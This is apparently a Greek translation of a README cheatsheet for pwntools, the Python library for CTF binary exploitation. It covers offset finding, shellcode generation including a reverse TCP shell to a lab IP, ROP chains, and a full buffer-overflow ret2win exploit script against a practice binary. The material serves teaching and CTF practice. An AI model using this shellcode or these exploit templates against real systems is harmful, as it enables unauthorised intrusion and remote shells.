<!-- language-home-navigation -->
[🏠 Ελληνική Αρχική Σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# pwntools Cheatsheet

Το [pwntools](https://github.com/Gallopsled/pwntools) είναι το καλύτερο στην κατηγορία του πλαίσιο CTF και βιβλιοθήκη ανάπτυξης εκμετάλλευσης γραμμένη σε Python. Σχεδιασμένο για γρήγορη δημιουργία πρωτοτύπων, δυαδική εκμετάλλευση (pwn) και αντίστροφη μηχανική, παρέχει μια ολοκληρωμένη σουίτα εργαλείων γραμμής εντολών (`pwn cyclic`, `pwn checksec`, `pwn asm`, `pwn shellcraft`) μαζί με ένα API υψηλού επιπέδου Python για αλληλεπίδραση με τοπικές διαδικασίες και απομακρυσμένες υποδοχές.

---

## Πίνακας περιεχομένων

- [Core Capabilities](#core-capabilities)
- [Εγκατάσταση](#installation)
- [Βοηθητικά προγράμματα γραμμής εντολών (`pwn <cmd>`)](#command-line-utilities-pwn-cmd)
  - [`pwn cyclic` (Υπολογισμός μετατόπισης buffer)](#pwn-cyclic-buffer-offset-calculation)
  - [`pwn checksec` (Mitigation Inspection)](#pwn-checksec-mitigation-inspection)
  - [`pwn asm` & `pwn disasm` (Συναρμολογητής / Αποσυναρμολογητής)](#pwn-asm--pwn-disasm-assembler--disassembler)
  - [`pwn shellcraft` (Shellcode Generator)](#pwn-shellcraft-shellcode-generator)
  - [`pwn template` (Exploit Skeleton Generator)](#pwn-template-exploit-skeleton-generator)
- [Ροή εργασιών ανάπτυξης Python Exploit](#python-exploit-development-workflow)
  - [Process & Remote Socket Connections](#process--remote-socket-connections)
  - [Elf Parsing & Symbols](#elf-parsing--symbols)
  - [ROP Chain Construction](#rop-chain-construction)
  - [Packing & Endianness (`p32` / `p64`)](#packing--endianness-p32--p64)
- [Παράδειγμα πλήρους εκμετάλλευσης (Υπερχείλιση buffer + ret2win)](#complete-exploit-example-buffer-overflow--ret2win)

---

## Βασικές Δυνατότητες

- **Αρχιτεκτονική Tubes:** Ενοποιημένη διεπαφή για αλληλεπίδραση με τοπικές διεργασίες (`process`), απομακρυσμένες υποδοχές TCP (`remote`) και συνεδρίες SSH (`ssh`).
- **Δυαδική επιθεώρηση & Gadget:** Αυτοματοποιημένη ανάλυση συμβόλων ELF, αναζήτηση GOT/PLT και αυτοματοποιημένη σύνθεση αλυσίδας ROP.
- **Συναρμολόγηση On-the-Fly:** Άμεση μετάφραση μεταξύ μνημονικών συναρμολόγησης και κωδικών opcodes σε x86, x86_64, ARM, MIPS και AArch64.
- **Σύνθεση Shellcode:** Προκατασκευασμένα, προσαρμόσιμα πρότυπα shellcode για αντίστροφα κελύφη, execve, ανάγνωση αρχείων και διαφυγή.

---

## Εγκατάσταση
```bash
# Ubuntu / Debian / Kali Linux
sudo apt-get update && sudo apt-get install -y python3-pwntools

# Via pip in an isolated Python environment
pip3 install pwntools

# Verify command-line utilities
pwn version
```
---

## Βοηθητικά προγράμματα γραμμής εντολών (`pwn <cmd>`)

### `pwn cyclic` (Υπολογισμός μετατόπισης buffer)
Δημιουργήστε μοναδικά κυκλικά μοτίβα De Bruijn για να προσδιορίσετε την ακριβή μετατόπιση σφάλματος (αντικατάσταση EIP / RIP):
```bash
# Generate a 200-byte unique pattern
pwn cyclic 200

# Find offset of crashing pattern (e.g. from crash address or register value 0x6161616c)
pwn cyclic -l 0x6161616c
# Output: 44 (offset is exactly 44 bytes to saved instruction pointer)

# 64-bit architecture cyclic pattern lookup
pwn cyclic -l "faaa" -n 8
```
### `pwn checksec` (Επιθεώρηση μετριασμού)
Ελέγξτε τους μετριασμούς ασφαλείας (Canary, NX, PIE, RELRO, ASLR) οποιουδήποτε εκτελέσιμου ELF:
```bash
pwn checksec /path/to/binary
```
### `pwn asm` & `pwn disasm` (Συναρμολογητής / Αποσυναρμολογητής)
Συγκεντρώστε οδηγίες σε byte shellcode απευθείας από το τερματικό:
```bash
# Assemble x86 instructions to hex bytes
pwn asm "xor eax, eax; push eax"

# Assemble 64-bit shellcode with null-byte output format
pwn asm -c amd64 "mov rax, 59; syscall" --format hex

# Disassemble raw hex bytes back to assembly
pwn disasm "31c050682f2f7368682f62696e89e3505389e1b00bcd80" -c i386
```
### `pwn shellcraft` (Γεννήτρια Shellcode)
Δημιουργήστε ωφέλιμα φορτία shellcode έτοιμα για παραγωγή απευθείας σε τερματικά stdout ή δυαδικά αρχεία:
```bash
# Generate Linux x64 execve /bin/sh shellcode in hex
pwn shellcraft amd64.linux.sh --format hex

# Generate reverse TCP shellcode (IP: 10.10.14.5, Port: 4444)
pwn shellcraft amd64.linux.connect 10.10.14.5 4444

# Output pure raw bytes directly into a file
pwn shellcraft amd64.linux.sh --format raw > shellcode.bin
```
### `pwn template` (Exploit Skeleton Generator)
Δημιουργήστε ένα πρότυπο εκμετάλλευσης Python δοκιμασμένο στη μάχη για έναν δυαδικό και απομακρυσμένο διακομιστή στόχο:
```bash
pwn template ./vuln_binary --host 10.10.10.100 --port 1337 > exploit.py
```
---

## Ροή εργασιών ανάπτυξης Python Exploit

### Διαδικασία & Συνδέσεις απομακρυσμένης υποδοχής
```python
from pwn import *

# Set target architecture and log level
context.arch = 'amd64'
context.log_level = 'debug'

# Local process execution
io = process('./vuln_binary')

# Or connect to remote CTF instance
# io = remote('10.10.10.100', 1337)

# Send and receive data
io.recvuntil(b'Enter your name: ')
io.sendline(b'Alice')

# Switch to interactive shell once exploit succeeds
io.interactive()
```
### ELF Parsing & Symbols
Αυτόματη ανάγνωση διευθύνσεων συναρτήσεων, πινάκων GOT και PLT χωρίς μη αυτόματες αναζητήσεις GDB:
```python
elf = ELF('./vuln_binary')
print(f"Target function address: {hex(elf.symbols['win'])}")
print(f"puts() PLT address: {hex(elf.plt['puts'])}")
print(f"puts() GOT address: {hex(elf.got['puts'])}")
```
### Κατασκευή αλυσίδων ROP
Δημιουργία αλυσίδων προγραμματισμού προσανατολισμένου στην επιστροφή (ROP) αυτόματα:
```python
elf = ELF('./vuln_binary')
rop = ROP(elf)

# Call win_function(0x1337, 0xdeadbeef)
rop.win(0x1337, 0xdeadbeef)
print(rop.dump())

payload = b"A" * 40 + rop.chain()
```
### Συσκευασία & Endianness (`p32` / `p64`)
Μετατρέψτε διευθύνσεις ακέραιης μνήμης σε byte μικρής κλίμακας:
```python
# 32-bit little-endian packing
address_32 = p32(0x080484b6)  # Returns b'\xb6\x84\x04\x08'

# 64-bit little-endian packing
address_64 = p64(0x0000000000401156)

# Unpacking bytes to integer
val = u64(b"\x56\x11\x40\x00\x00\x00\x00\x00")
```
---

## Παράδειγμα πλήρους εκμετάλλευσης (Υπερχείλιση buffer + ret2win)
```python
#!/usr/bin/env python3
from pwn import *

# Binary configuration
binary_path = './challenge'
context.binary = binary_path
context.log_level = 'info'

elf = ELF(binary_path)

# 1. Start target process or remote connection
if args.REMOTE:
    io = remote('target.ctf.local', 9999)
else:
    io = process(binary_path)

# 2. Craft payload
offset = 40
win_address = elf.symbols['win']

# Include ret gadget for 16-byte stack alignment in Ubuntu 64-bit
rop = ROP(elf)
ret_gadget = rop.find_gadget(['ret'])[0]

payload = flat(
    asm('nop') * offset,
    ret_gadget,
    win_address
)

# 3. Deliver payload
io.recvuntil(b'Say something: ')
io.sendline(payload)

# 4. Drop to interactive shell
log.success("Exploit sent! Enjoy your shell:")
io.interactive()
```